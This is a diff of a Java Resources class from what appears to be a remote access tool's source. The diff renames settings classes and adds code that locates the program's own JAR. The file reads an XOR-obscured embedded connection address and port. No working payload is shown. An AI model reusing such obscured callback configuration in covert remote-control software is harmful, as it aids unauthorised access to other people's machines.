@@ -1,5 +1,7 @@
 package de.sogomn.rat.util;
 
+import java.io.File;
+import java.net.URISyntaxException;
 import java.util.ResourceBundle;
 
 import javax.swing.JDialog;
@@ -9,22 +11,22 @@ import javax.swing.UIManager;
 import javax.swing.plaf.nimbus.NimbusLookAndFeel;
 
 import de.sogomn.engine.util.FileUtils;
-import de.sogomn.rat.GUISettings;
+import de.sogomn.rat.Server;
 import de.sogomn.rat.service.IOperatingSystemService;
 
 public final class Resources {
 	
-	private static final String CONNECTION_DATA_FILE_NAME = "/data";
+	private static final String DATA_PATH = "/data";
 	
 	public static final String VERSION = "1.24.0";
 	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
 	public static final IOperatingSystemService OS_SERVICE = IOperatingSystemService.getInstance();
-	
 	public static final String ADDRESS;
 	public static final int PORT;
+	public static final File JAR_FILE;
 	
 	static {
-		final byte[] data = FileUtils.readInternalData(CONNECTION_DATA_FILE_NAME);
+		final byte[] data = FileUtils.readInternalData(DATA_PATH);
 		
 		XorCipher.crypt(data);
 		
@@ -51,6 +53,18 @@ public final class Resources {
 		PORT = port;
 	}
 	
+	static {
+		File jarFile = null;
+		
+		try {
+			jarFile = new File(Server.class.getProtectionDomain().getCodeSource().getLocation().toURI());
+		} catch (final URISyntaxException ex) {
+			ex.printStackTrace();
+		}
+		
+		JAR_FILE = jarFile;
+	}
+	
 	private Resources() {
 		//...
 	}
@@ -74,7 +88,7 @@ public final class Resources {
 		
 		JFrame.setDefaultLookAndFeelDecorated(true);
 		JDialog.setDefaultLookAndFeelDecorated(true);
-		GUISettings.setDefaults(defaults);
+		NimbusGuiSettings.setDefaults(defaults);
 		
 		try {
 			UIManager.setLookAndFeel(nimbus);
